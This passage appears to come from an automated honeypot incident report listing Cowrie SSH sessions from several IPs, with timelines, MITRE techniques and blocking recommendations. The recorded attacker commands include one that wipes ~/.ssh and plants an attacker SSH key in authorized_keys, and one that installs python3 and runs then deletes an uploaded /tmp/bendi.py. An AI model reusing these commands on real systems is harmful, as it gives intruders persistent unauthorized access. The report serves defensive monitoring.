- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56c2d620c88d

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-06-30 11:29 |
| **Last Seen** | 2026-06-30 11:31 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:29:31` | `cowrie.session.connect` |
| `2026-06-30 11:29:31` | `cowrie.client.version` |
| `2026-06-30 11:29:31` | `cowrie.client.kex` |
| `2026-06-30 11:29:32` | `cowrie.login.success` |
| `2026-06-30 11:29:34` | `cowrie.session.file_upload` |
| `2026-06-30 11:29:36` | `cowrie.session.params` |
| `2026-06-30 11:29:36` | `cowrie.command.input` |
| `2026-06-30 11:29:36` | `cowrie.command.input` |
| `2026-06-30 11:29:36` | `cowrie.command.input` |
| `2026-06-30 11:29:36` | `cowrie.command.failed` |
| `2026-06-30 11:29:36` | `cowrie.log.closed` |
| `2026-06-30 11:29:37` | `cowrie.session.params` |
| `2026-06-30 11:29:37` | `cowrie.command.input` |
| `2026-06-30 11:29:37` | `cowrie.log.closed` |
| `2026-06-30 11:29:38` | `cowrie.session.params` |
| `2026-06-30 11:29:38` | `cowrie.command.input` |
| `2026-06-30 11:29:38` | `cowrie.log.closed` |
| `2026-06-30 11:29:39` | `cowrie.session.params` |
| `2026-06-30 11:29:39` | `cowrie.command.input` |
| `2026-06-30 11:29:39` | `cowrie.command.failed` |
| `2026-06-30 11:29:39` | `cowrie.command.failed` |
| `2026-06-30 11:30:41` | `cowrie.session.params` |
| `2026-06-30 11:30:41` | `cowrie.command.input` |
| `2026-06-30 11:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98cd67585813

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-06-30 11:31 |
| **Last Seen** | 2026-06-30 11:34 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:31:57` | `cowrie.session.connect` |
| `2026-06-30 11:31:57` | `cowrie.client.version` |
| `2026-06-30 11:31:57` | `cowrie.client.kex` |
| `2026-06-30 11:31:58` | `cowrie.login.success` |
| `2026-06-30 11:32:00` | `cowrie.session.file_upload` |
| `2026-06-30 11:32:01` | `cowrie.session.params` |
| `2026-06-30 11:32:01` | `cowrie.command.input` |
| `2026-06-30 11:32:01` | `cowrie.command.input` |
| `2026-06-30 11:32:01` | `cowrie.command.input` |
| `2026-06-30 11:32:01` | `cowrie.command.failed` |
| `2026-06-30 11:32:01` | `cowrie.log.closed` |
| `2026-06-30 11:32:02` | `cowrie.session.params` |
| `2026-06-30 11:32:02` | `cowrie.command.input` |
| `2026-06-30 11:32:02` | `cowrie.log.closed` |
| `2026-06-30 11:32:04` | `cowrie.session.params` |
| `2026-06-30 11:32:04` | `cowrie.command.input` |
| `2026-06-30 11:32:04` | `cowrie.log.closed` |
| `2026-06-30 11:32:05` | `cowrie.session.params` |
| `2026-06-30 11:32:05` | `cowrie.command.input` |
| `2026-06-30 11:32:05` | `cowrie.command.failed` |
| `2026-06-30 11:32:05` | `cowrie.command.failed` |
| `2026-06-30 11:33:06` | `cowrie.session.params` |
| `2026-06-30 11:33:06` | `cowrie.command.input` |
| `2026-06-30 11:34:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-505730ca5725

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 11:33 |
| **Last Seen** | 2026-06-30 11:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:33:10` | `cowrie.session.connect` |
| `2026-06-30 11:33:11` | `cowrie.client.version` |
| `2026-06-30 11:33:11` | `cowrie.client.kex` |
| `2026-06-30 11:33:14` | `cowrie.login.success` |
| `2026-06-30 11:33:15` | `cowrie.session.params` |
| `2026-06-30 11:33:15` | `cowrie.command.input` |
| `2026-06-30 11:33:16` | `cowrie.log.closed` |
| `2026-06-30 11:33:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-441108a86e90

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 11:36 |
| **Last Seen** | 2026-06-30 11:37 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:36:58` | `cowrie.session.connect` |
| `2026-06-30 11:36:59` | `cowrie.client.version` |
| `2026-06-30 11:36:59` | `cowrie.client.kex` |
| `2026-06-30 11:37:05` | `cowrie.login.success` |
| `2026-06-30 11:37:08` | `cowrie.session.params` |
| `2026-06-30 11:37:08` | `cowrie.command.input` |
| `2026-06-30 11:37:10` | `cowrie.log.closed` |
| `2026-06-30 11:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4b2ea73badd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 11:40 |
| **Last Seen** | 2026-06-30 11:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:40:12` | `cowrie.session.connect` |
| `2026-06-30 11:40:12` | `cowrie.client.version` |
| `2026-06-30 11:40:12` | `cowrie.client.kex` |
| `2026-06-30 11:40:12` | `cowrie.login.success` |
| `2026-06-30 11:40:13` | `cowrie.session.params` |
| `2026-06-30 11:40:13` | `cowrie.command.input` |
| `2026-06-30 11:40:13` | `cowrie.log.closed` |
| `2026-06-30 11:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b026878f7982

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 11:48 |
| **Last Seen** | 2026-06-30 11:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:48:22` | `cowrie.session.connect` |
| `2026-06-30 11:48:22` | `cowrie.client.version` |
| `2026-06-30 11:48:22` | `cowrie.client.kex` |
| `2026-06-30 11:48:23` | `cowrie.login.success` |
| `2026-06-30 11:48:25` | `cowrie.session.params` |
| `2026-06-30 11:48:25` | `cowrie.command.input` |
| `2026-06-30 11:48:25` | `cowrie.log.closed` |
| `2026-06-30 11:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa5feb63bec4

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 11:49 |
| **Last Seen** | 2026-06-30 11:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:49:04` | `cowrie.session.connect` |
| `2026-06-30 11:49:05` | `cowrie.client.version` |
| `2026-06-30 11:49:05` | `cowrie.client.kex` |
| `2026-06-30 11:49:11` | `cowrie.login.success` |
| `2026-06-30 11:49:15` | `cowrie.session.params` |
| `2026-06-30 11:49:15` | `cowrie.command.input` |
| `2026-06-30 11:49:16` | `cowrie.log.closed` |
| `2026-06-30 11:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12620eba417

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 12:01 |
| **Last Seen** | 2026-06-30 12:01 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:01:13` | `cowrie.session.connect` |
| `2026-06-30 12:01:15` | `cowrie.client.version` |
| `2026-06-30 12:01:15` | `cowrie.client.kex` |
| `2026-06-30 12:01:21` | `cowrie.login.success` |
| `2026-06-30 12:01:24` | `cowrie.session.params` |
| `2026-06-30 12:01:24` | `cowrie.command.input` |
| `2026-06-30 12:01:26` | `cowrie.log.closed` |
| `2026-06-30 12:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f803b8f54b42

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 12:04 |
| **Last Seen** | 2026-06-30 12:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:04:07` | `cowrie.session.connect` |
| `2026-06-30 12:04:07` | `cowrie.client.version` |
| `2026-06-30 12:04:07` | `cowrie.client.kex` |
| `2026-06-30 12:04:09` | `cowrie.login.success` |
| `2026-06-30 12:04:11` | `cowrie.session.params` |
| `2026-06-30 12:04:11` | `cowrie.command.input` |
| `2026-06-30 12:04:12` | `cowrie.log.closed` |
| `2026-06-30 12:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11ff77477230

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 12:13 |
| **Last Seen** | 2026-06-30 12:13 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:13:25` | `cowrie.session.connect` |
| `2026-06-30 12:13:26` | `cowrie.client.version` |
| `2026-06-30 12:13:26` | `cowrie.client.kex` |
| `2026-06-30 12:13:33` | `cowrie.login.success` |
| `2026-06-30 12:13:36` | `cowrie.session.params` |
| `2026-06-30 12:13:36` | `cowrie.command.input` |
| `2026-06-30 12:13:37` | `cowrie.log.closed` |
| `2026-06-30 12:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf5d7f975ed

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 12:19 |
| **Last Seen** | 2026-06-30 12:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:19:56` | `cowrie.session.connect` |
| `2026-06-30 12:19:57` | `cowrie.client.version` |
| `2026-06-30 12:19:57` | `cowrie.client.kex` |
| `2026-06-30 12:19:58` | `cowrie.login.success` |
| `2026-06-30 12:20:00` | `cowrie.session.params` |
| `2026-06-30 12:20:00` | `cowrie.command.input` |
| `2026-06-30 12:20:01` | `cowrie.log.closed` |
| `2026-06-30 12:20:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33387a8f3f59

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 12:25 |
| **Last Seen** | 2026-06-30 12:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:25:30` | `cowrie.session.connect` |
| `2026-06-30 12:25:31` | `cowrie.client.version` |
| `2026-06-30 12:25:31` | `cowrie.client.kex` |
| `2026-06-30 12:25:37` | `cowrie.login.success` |
| `2026-06-30 12:25:41` | `cowrie.session.params` |
| `2026-06-30 12:25:41` | `cowrie.command.input` |
| `2026-06-30 12:25:42` | `cowrie.log.closed` |
| `2026-06-30 12:25:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01caeda68128

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 12:34 |
| **Last Seen** | 2026-06-30 12:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:34:57` | `cowrie.session.connect` |
| `2026-06-30 12:34:57` | `cowrie.client.version` |
| `2026-06-30 12:34:57` | `cowrie.client.kex` |
| `2026-06-30 12:34:58` | `cowrie.login.success` |
| `2026-06-30 12:34:59` | `cowrie.session.params` |
| `2026-06-30 12:34:59` | `cowrie.command.input` |
| `2026-06-30 12:34:59` | `cowrie.log.closed` |
| `2026-06-30 12:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b54ced3fc5b8

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 12:35 |
| **Last Seen** | 2026-06-30 12:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:35:44` | `cowrie.session.connect` |
| `2026-06-30 12:35:44` | `cowrie.client.version` |
| `2026-06-30 12:35:44` | `cowrie.client.kex` |
| `2026-06-30 12:35:47` | `cowrie.login.success` |
| `2026-06-30 12:35:49` | `cowrie.session.params` |
| `2026-06-30 12:35:49` | `cowrie.command.input` |
| `2026-06-30 12:35:49` | `cowrie.log.closed` |
| `2026-06-30 12:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ebd5aeb2a53

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 12:37 |
| **Last Seen** | 2026-06-30 12:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:37:37` | `cowrie.session.connect` |
| `2026-06-30 12:37:38` | `cowrie.client.version` |
| `2026-06-30 12:37:38` | `cowrie.client.kex` |
| `2026-06-30 12:37:43` | `cowrie.login.success` |
| `2026-06-30 12:37:47` | `cowrie.session.params` |
| `2026-06-30 12:37:47` | `cowrie.command.input` |
| `2026-06-30 12:37:48` | `cowrie.log.closed` |
| `2026-06-30 12:37:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac1de2fa466f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 12:49 |
| **Last Seen** | 2026-06-30 12:49 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:49:04` | `cowrie.session.connect` |
| `2026-06-30 12:49:05` | `cowrie.client.version` |
| `2026-06-30 12:49:05` | `cowrie.client.kex` |
| `2026-06-30 12:49:11` | `cowrie.login.success` |
| `2026-06-30 12:49:14` | `cowrie.session.params` |
| `2026-06-30 12:49:14` | `cowrie.command.input` |
| `2026-06-30 12:49:17` | `cowrie.log.closed` |
| `2026-06-30 12:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53b441fc78b5

| Field | Detail |
|---|---|
| **Source IP** | `112.91.141[.]230` |
| **First Seen** | 2026-06-30 12:49 |
| **Last Seen** | 2026-06-30 12:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:49:38` | `cowrie.session.connect` |
| `2026-06-30 12:49:38` | `cowrie.client.version` |
| `2026-06-30 12:49:38` | `cowrie.client.kex` |
| `2026-06-30 12:49:39` | `cowrie.login.success` |
| `2026-06-30 12:49:40` | `cowrie.session.params` |
| `2026-06-30 12:49:40` | `cowrie.command.input` |
| `2026-06-30 12:49:41` | `cowrie.log.closed` |
| `2026-06-30 12:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.91.141[.]230` to AbuseIPDB if not already reported
- [ ] Block `112.91.141[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-691cbebc00de

| Field | Detail |
|---|---|
| **Source IP** | `34.76.137[.]133` |
| **First Seen** | 2026-06-30 12:50 |
| **Last Seen** | 2026-06-30 12:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:50:53` | `cowrie.session.connect` |
| `2026-06-30 12:50:53` | `cowrie.login.success` |
| `2026-06-30 12:50:54` | `cowrie.session.params` |
| `2026-06-30 12:50:54` | `cowrie.command.input` |
| `2026-06-30 12:50:54` | `cowrie.command.input` |
| `2026-06-30 12:50:54` | `cowrie.command.failed` |
| `2026-06-30 12:50:54` | `cowrie.command.input` |
| `2026-06-30 12:50:54` | `cowrie.log.closed` |
| `2026-06-30 12:50:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.137[.]133` to AbuseIPDB if not already reported
- [ ] Block `34.76.137[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0725eb074122

| Field | Detail |
|---|---|
| **Source IP** | `34.76.137[.]133` |
| **First Seen** | 2026-06-30 12:51 |
| **Last Seen** | 2026-06-30 12:51 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:51:02` | `cowrie.session.connect` |
| `2026-06-30 12:51:02` | `cowrie.login.success` |
| `2026-06-30 12:51:02` | `cowrie.session.params` |
| `2026-06-30 12:51:02` | `cowrie.command.input` |
| `2026-06-30 12:51:02` | `cowrie.command.failed` |
| `2026-06-30 12:51:13` | `cowrie.log.closed` |
| `2026-06-30 12:51:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.137[.]133` to AbuseIPDB if not already reported
- [ ] Block `34.76.137[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b3508441e75

| Field | Detail |
|---|---|
| **Source IP** | `34.76.137[.]133` |
| **First Seen** | 2026-06-30 12:51 |
| **Last Seen** | 2026-06-30 12:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:51:03` | `cowrie.session.connect` |
| `2026-06-30 12:51:03` | `cowrie.login.success` |
| `2026-06-30 12:51:04` | `cowrie.session.params` |
| `2026-06-30 12:51:04` | `cowrie.command.input` |
| `2026-06-30 12:51:13` | `cowrie.log.closed` |
| `2026-06-30 12:51:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.137[.]133` to AbuseIPDB if not already reported
- [ ] Block `34.76.137[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd8dbc1244c

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-30 12:51 |
| **Last Seen** | 2026-06-30 12:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:51:07` | `cowrie.session.connect` |
| `2026-06-30 12:51:07` | `cowrie.client.version` |
| `2026-06-30 12:51:07` | `cowrie.client.kex` |
| `2026-06-30 12:51:07` | `cowrie.login.success` |
| `2026-06-30 12:51:08` | `cowrie.session.params` |
| `2026-06-30 12:51:08` | `cowrie.command.input` |
| `2026-06-30 12:51:08` | `cowrie.command.failed` |
| `2026-06-30 12:51:08` | `cowrie.log.closed` |
| `2026-06-30 12:51:09` | `cowrie.session.params` |
| `2026-06-30 12:51:09` | `cowrie.command.input` |
| `2026-06-30 12:51:09` | `cowrie.session.file_download` |
| `2026-06-30 12:51:09` | `cowrie.log.closed` |
| `2026-06-30 12:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-159ded12fa6d

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-30 12:51 |
| **Last Seen** | 2026-06-30 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:51:09` | `cowrie.session.connect` |
| `2026-06-30 12:51:09` | `cowrie.client.version` |
| `2026-06-30 12:51:09` | `cowrie.client.kex` |
| `2026-06-30 12:51:09` | `cowrie.login.success` |
| `2026-06-30 12:51:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32974b33ef17

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-30 12:51 |
| **Last Seen** | 2026-06-30 12:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 12:51:10` | `cowrie.session.connect` |
| `2026-06-30 12:51:10` | `cowrie.client.version` |
| `2026-06-30 12:51:10` | `cowrie.client.kex` |
| `2026-06-30 12:51:10` | `cowrie.login.success` |
| `2026-06-30 12:51:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebbbd0cb0b58

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
